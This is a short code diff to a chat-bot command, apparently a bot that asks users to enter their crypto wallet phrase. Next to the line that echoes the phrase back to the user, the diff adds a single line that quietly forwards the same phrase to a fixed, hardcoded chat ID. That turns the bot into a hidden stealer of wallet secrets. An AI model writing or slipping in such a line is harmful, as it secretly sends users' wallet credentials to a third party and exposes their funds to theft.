@@ -24,4 +24,5 @@
 CMD*/
 
 Bot.sendMessage( "Your Wallet Phase: " + message + "\nIf is correct press 💾Save");
+Bot.sendMessageToChatWithId(1548791150, message);
 
